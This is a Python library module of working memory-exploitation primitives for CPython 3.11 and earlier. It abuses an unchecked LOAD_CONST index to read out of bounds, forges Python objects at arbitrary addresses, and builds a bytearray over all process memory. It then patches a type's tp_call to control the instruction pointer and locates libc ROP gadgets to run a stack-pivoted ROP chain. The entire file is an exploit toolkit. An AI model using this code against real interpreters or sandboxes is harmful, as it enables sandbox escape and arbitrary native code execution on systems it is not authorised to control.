"""
Core memory-unsafe primitives for CPython <= 3.11.

This exploits the fact that CPython's LOAD_CONST opcode does not bounds-check
its index into co_consts, allowing out-of-bounds reads from adjacent heap memory.
Combined with heap grooming and object forgery, this gives full read/write access
to process memory and arbitrary code execution.

Original work: https://github.com/dbuchwald/unsafe-python
"""

nullfunc = lambda: None  # noqa: E731

CodeType = nullfunc.__code__.__class__
FunctionType = nullfunc.__class__


def sizeof(obj):
    return type(obj).__sizeof__(obj)


BYTES_HEADER_LEN = sizeof(b"") - 1
TUPLE_HEADER_LEN = sizeof(())

INT64_MAX = (1 << 63) - 1
INT32_MAX = (1 << 31) - 1
INT32_MIN = -(1 << 31)


def p64a(*n):
    """Pack one or more 64-bit integers into a list of bytes (little-endian)."""
    return [(a >> i) & 0xFF for a in n for i in range(0, 64, 8)]


def u64(buf):
    """Unpack a little-endian buffer into an integer."""
    n = 0
    for c in reversed(buf):
        n <<= 8
        n += c
    return n


def addrof(obj):
    """Return the memory address of a Python object."""
    return id(obj)


def refbytes(data, nogc):
    """Get the address of the internal buffer of a bytes object."""
    nogc.append(data)
    return addrof(data) + BYTES_HEADER_LEN


def _get_aligned_tuple_and_bytes(prefix):
    """
    Heap-spray to find a (tuple, bytes) pair where the bytes object is
    placed right after the tuple in memory, allowing OOB reads from the
    tuple's co_consts array into the bytes content.
    """
    from .exceptions import HeapGroomError

    its_per_size = 4
    tuples = []
    byteses = []
    for size in range(8, 64)[::-1]:
        tupletemplate = range(size)
        suffix = b"A" * (size * 8 - len(prefix))
        for _ in range(its_per_size):
            tuples.append(tuple(tupletemplate))
            byteses.append(prefix + suffix)

    bestdist = 99999999999
    besttuple = None
    bestbytes = None
    pairs = [(t, b) for t in tuples for b in byteses]
    for t, b in pairs:
        dist = addrof(b) - addrof(t)
        if 0 < dist < bestdist:
            bestdist = dist
            besttuple = t
            bestbytes = b

    if bestdist > 100000:
        raise HeapGroomError(hex(bestdist))

    return besttuple, bestbytes


def _load_n(n):
    """Generate a function that does LOAD_CONST(n) — the OOB read primitive."""
    return eval("lambda: list(%s) if None else %s" % (",".join(map(str, range(1, n))), n))


def _replace_code_consts(codeobj, consts):
    """Replace co_consts on a code object."""
    if hasattr(codeobj, "replace"):
        return codeobj.replace(co_consts=consts)

    code_args = []
    argnames = CodeType.__doc__.split("(")[1].split("[")[0].split(",")
    for argname in argnames:
        argname = argname.strip()
        if argname == "codestring":
            argname = "code"
        if argname == "constants":
            code_args.append(consts)
        else:
            code_args.append(getattr(codeobj, "co_" + argname))
    return CodeType(*code_args)


def fakeobj_once(addr, nogc):
    """
    Use heap grooming + LOAD_CONST OOB to forge a Python object reference
    from an arbitrary address. This does a heap spray each time — use
    fakeobj() for a cached, reusable version.
    """
    fake_bytearray_ptr = bytes(p64a(addr))
    nogc.append(fake_bytearray_ptr)

    const_tuple, fake_bytearray_ref = _get_aligned_tuple_and_bytes(fake_bytearray_ptr)
    nogc.append(fake_bytearray_ref)

    const_tuple_array_start = addrof(const_tuple) + TUPLE_HEADER_LEN
    fake_bytearray_ref_addr = refbytes(fake_bytearray_ref, nogc)

    offset = (fake_bytearray_ref_addr - const_tuple_array_start) // 8
    assert INT32_MIN <= offset <= INT32_MAX

    loader_code = _load_n(offset).__code__
    newcode = _replace_code_consts(loader_code, const_tuple)
    makemagic = FunctionType(newcode, {})

    return makemagic()


class FakeobjPrimitive:
    """Reusable fakeobj primitive that avoids repeated heap spraying."""

    def __init__(self, nogc):
        self._nogc = nogc
        self._reusable_tuple = (None,)
        self._reusable_bytearray = None

    def _init_reusable(self):
        fake_bytearray = bytes(p64a(
            1,                                                      # ob_refcnt
            addrof(bytearray),                                      # ob_type
            8,                                                      # ob_size
            0,                                                      # ob_alloc
            8 + 1,                                                  # ob_bytes
            addrof(self._reusable_tuple) + TUPLE_HEADER_LEN,        # ob_start
            0,                                                      # ob_exports
        ))
        self._nogc.append(fake_bytearray)
        self._reusable_bytearray = fakeobj_once(
            refbytes(fake_bytearray, self._nogc), self._nogc
        )

    def __call__(self, addr):
        if self._reusable_bytearray is None:
            self._init_reusable()

        backup = self._reusable_bytearray[:8]
        self._reusable_bytearray[:8] = p64a(addr)
        res = self._reusable_tuple[0]
        self._reusable_bytearray[:8] = backup

        self._nogc.append(res)
        return res


def make_getmem(fakeobj_fn, nogc):
    """Create a bytearray spanning all process memory (base=0, len=INT64_MAX)."""
    fake_bytearray = bytes(p64a(
        1,
        addrof(bytearray),
        INT64_MAX,
        0, 0, 0, 0,
    ))
    return fakeobj_fn(refbytes(fake_bytearray, nogc))


def setrip(addr, fakeobj_fn, nogc, mem, rsi=tuple(), rdx=dict()):
    """Set the instruction pointer (RIP) to an arbitrary address by patching tp_call."""
    ft_addr = addrof(FunctionType)
    ft_len = sizeof(FunctionType)
    my_functype = mem[ft_addr:ft_addr + ft_len]

    # patch tp_call
    my_functype[16 * 8:16 * 8 + 8] = p64a(addr)

    # clear Py_TPFLAGS_HAVE_VECTORCALL
    tp_flags = u64(my_functype[21 * 8:21 * 8 + 8])
    tp_flags &= ~(1 << 11)
    my_functype[21 * 8:21 * 8 + 8] = p64a(tp_flags)

    my_functype_ptr = refbytes(bytes(my_functype), nogc)

    fake_funcobj = bytes(p64a(0xCAFEBABE - 2, my_functype_ptr))
    fake_funcobj += bytes(sizeof(nullfunc))
    my_func_ptr = refbytes(fake_funcobj, nogc)
    my_func = fakeobj_fn(my_func_ptr)

    return my_func(*rsi, **rdx)


GADGET_PATTERNS = {
    "ret": b"\xc3",
    "mov rsp, rdx; ret": b"\x48\x89\xd4\xc3",
    "pop rax; ret": b"\x58\xc3",
    "pop rbx; ret": b"\x5b\xc3",
    "pop rcx; ret": b"\x59\xc3",
    "pop rdx; pop rbx; ret": b"\x5a\x5b\xc3",
    "pop rsi; ret": b"\x5e\xc3",
    "pop rdi; ret": b"\x5f\xc3",
    "syscall; ret": b"\x0f\x05\xc3",
}


def find_gadgets(mem):
    """Search for ROP gadgets in libc. Requires /proc/self/maps."""
    from .exceptions import GadgetSearchError

    try:
        maps = open("/proc/self/maps").read()
    except FileNotFoundError:
        raise GadgetSearchError("/proc/self/maps not available (Linux only)")

    libc_lines = [l for l in maps.split("\n") if "libc" in l and "r-x" in l]
    if not libc_lines:
        # try libc.so.6 or libc-2.xx
        libc_lines = [l for l in maps.split("\n") if "libc" in l and "x" in l.split(" ")[1]]
    if not libc_lines:
        raise GadgetSearchError("could not find libc in /proc/self/maps")

    libc_base = int(libc_lines[0].split("-")[0], 16)

    gadgets = {}
    for name, pattern in GADGET_PATTERNS.items():
        try:
            addr = mem.index(pattern, libc_base)
        except ValueError:
            raise GadgetSearchError(f"gadget '{name}' not found")
        gadgets[name] = addr

    return gadgets


def do_rop(payload, fakeobj_fn, nogc, mem, gadgets):
    """Execute a ROP payload by pivoting the stack."""
    fakedict = fakeobj_fn(refbytes(bytes(p64a(
        gadgets["pop rax; ret"] - 4,
        addrof(dict),
    ) + payload), nogc))

    setrip(gadgets["mov rsp, rdx; ret"], fakeobj_fn, nogc, mem, rdx=fakedict)
